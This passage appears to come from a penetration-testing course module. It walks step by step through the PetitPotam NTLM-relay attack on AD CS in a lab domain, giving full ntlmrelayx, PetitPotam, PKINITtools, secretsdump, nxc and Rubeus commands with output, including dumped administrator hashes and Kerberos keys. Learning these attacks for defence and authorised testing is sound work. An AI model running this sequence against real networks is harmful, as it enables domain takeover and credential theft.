standard domain user account.\n\n---\n\n## PetitPotam (MS-EFSRPC)\n\nPetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.\n\n[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.\n\nLet's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.\n\n#### Starting ntlmrelayx.py\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - \n\nCopyright 2021 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[+] Protocol Attack DCSYNC loaded..\n[+] Protocol Attack HTTP loaded..\n[+] Protocol Attack HTTPS loaded..\n[+] Protocol Attack IMAP loaded..\n[+] Protocol Attack IMAPS loaded..\n[+] Protocol Attack LDAP loaded..\n[+] Protocol Attack LDAPS loaded..\n[+] Protocol Attack MSSQL loaded..\n[+] Protocol Attack RPC loaded..\n[+] Protocol Attack SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n```\n\nIn another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.\n\nThere is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).\n\nHere we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.\n\n#### Running PetitPotam.py\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       \n                                                                                 \n              ___            _        _      _        ___            _                     \n             | _ \\   ___    | |_     (_)    | |_     | _ \\   ___    | |_    __ _    _ __   \n             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \\   |  _|  / _` |  | '  \\  \n            _|_|_   \\___|   _\\__|   _|_|_   _\\__|   _|_|_   \\___/   _\\__|  \\__,_|  |_|_|_| \n          _| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n          \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-' \n                                         \n              PoC to elicit machine account authentication via some MS-EFSRPC functions\n                                      by topotam (@topotam77)\n      \n                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN\n\nTrying pipe lsarpc\n[-] Connecting to ncacn_np:172.16.5.5[\\PIPE\\lsarpc]\n[+] Connected!\n[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e\n[+] Successfully bound!\n[-] Sending EfsRpcOpenFileRaw!\n\n[+] Got expected ERROR_BAD_NETPATH exception!!\n[+] Attack worked!\n```\n\n#### Catching Base64 Encoded Certificate for DC01\n\nBack in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[+] Protocol Attack DCSYNC loaded..\n[+] Protocol Attack HTTP loaded..\n[+] Protocol Attack HTTPS loaded..\n[+] Protocol Attack IMAP loaded..\n[+] Protocol Attack IMAPS loaded..\n[+] Protocol Attack LDAP loaded..\n[+] Protocol Attack LDAPS loaded..\n[+] Protocol Attack MSSQL loaded..\n[+] Protocol Attack RPC loaded..\n[+] Protocol Attack SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\n[*] HTTP server returned error code 200, treating as a successful login\n[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED\n[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\n[*] HTTP server returned error code 200, treating as a successful login\n[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED\n[*] Generating CSR...\n[*] CSR generated!\n[*] Getting certificate...\n[*] GOT CERTIFICATE!\n[*] Base64 certificate of user ACADEMY-EA-DC01$: \n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\n[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed\n\n<SNIP>\n```\n\n#### Requesting a TGT Using gettgtpkinit.py\n\nNext, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n\n2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275\nINFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275\n2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n```\n\n#### Setting the KRB5CCNAME Environment Variable\n\nThe TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ export KRB5CCNAME=dc01.ccache\n```\n\n#### Using Domain Controller TGT to DCSync\n\nWe can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\ninlanefreight.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\ninlanefreight.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\ninlanefreight.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\ninlanefreight.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up... \n```\n\nWe could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. This is installed on ATTACK01 in the lab already).\n\n#### Running klist\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ klist\n\nTicket cache: FILE:dc01.ccache\nDefault principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL\n\nValid starting       Expires              Service principal\n04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL\n```\n\n#### Confirming Admin Access to the Domain Controller\n\nFinally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\n```\n\n#### Submitting a TGS Request for Ourselves Using getnthash.py\n\nWe can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\n313b6f423cd1ee07e91315b4919fb4ba\n```\n\nWe can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.\n\n#### Using Domain Controller NTLM Hash to DCSync\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\ninlanefreight.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\ninlanefreight.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\ninlanefreight.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\ninlanefreight.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up...\n```\n\nAlternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.\n\nNote: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.\n\n#### Requesting TGT and Performing PTT with DC01$ Machine Account\n\nBleeding Edge Vulnerabilities\n\n```powershell-session\nPS C:\\Tools> .\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\\ACADEMY-EA-DC01$'\n[*] Using domain controller: 172.16.5.5:88\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D\n      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC\n      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC\n      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P\n      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH\n      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame\n      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ\n      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89\n      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq\n      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE\n      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb\n      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4\n      